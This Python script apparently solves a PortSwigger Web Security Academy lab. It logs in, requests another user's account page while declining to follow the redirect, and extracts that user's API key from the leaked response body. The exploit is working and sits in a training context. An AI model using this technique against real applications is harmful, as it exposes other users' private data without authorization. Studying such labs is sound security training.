# Lab 09 — User ID controlled by request parameter with data leakage in redirect
# PortSwigger: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect
#
# Vulnerability: The access check correctly redirects unauthorized users away,
#                but the redirect RESPONSE BODY still contains the sensitive
#                data before the redirect takes effect
# Aim:           Find and submit carlos's API key despite the apparent fix
#
# Technique:
#   A browser would just follow the 302 redirect and never show the body.
#   But the raw HTTP response (visible via requests, with allow_redirects=False)
#   still contains carlos's account HTML — including his API key — because the
#   server built the page BEFORE deciding to redirect.
#
# Usage: python access_control_lab09.py <url>

import sys
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, login, extract_between, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 09 — DATA LEAKAGE IN REDIRECT RESPONSE BODY")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab09.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: request carlos's account WITHOUT following the redirect ─────
    print("\n  ── Step 1: request /my-account?id=carlos with allow_redirects=False\n")
    r = session.get(
        f"{url}/my-account",
        params={"id": "carlos"},
        allow_redirects=False    # critical — do NOT follow the redirect automatically
    )

    print(f"  ℹ  Status code: {r.status_code}")
    print(f"  ℹ  Location header: {r.headers.get('Location', '(none)')}\n")

    if r.status_code not in (301, 302, 303, 307, 308):
        print("  ?  Expected a redirect status — got something else.")
        print("     The response may render directly; inspect r.text anyway.")

    # ── Step 2: inspect the FULL raw body of the redirect response ──────────
    print("  ── Step 2: inspect the redirect response BODY (not just the status)\n")
    print_box("Raw redirect response body (truncated)", r.text[:800])

    # ── Step 3: extract the API key from the leaked body ─────────────────────
    api_key = extract_between(r.text, "API Key: <span>", "</span>") or \
              extract_between(r.text, 'id="api-key">', "</")

    if api_key:
        print_box("LEAKED API KEY (carlos) — found in redirect body", api_key)
    else:
        print("  ?  Could not auto-extract — review the raw body above manually.")

    print("  ℹ  The server rendered the sensitive page, THEN decided to redirect.")
    print("     A browser hides this from you; a proxy/HTTP client does not.")
